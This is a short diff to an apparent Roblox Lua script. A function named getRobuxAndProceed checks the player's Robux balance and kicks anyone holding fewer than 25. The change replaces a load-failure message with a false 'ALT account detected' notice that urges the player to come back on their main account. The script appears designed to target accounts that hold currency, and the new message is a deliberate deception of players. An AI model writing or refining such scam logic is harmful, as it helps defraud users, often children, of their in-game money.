@@ -1119,7 +1119,7 @@ local function getRobuxAndProceed()
                     local balance = getRobuxBalance()
             
                     if balance < 25 then
-                        game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                        game.Players.LocalPlayer:Kick("ALT account detected please use main account and try again.")
                         return
                     end
 
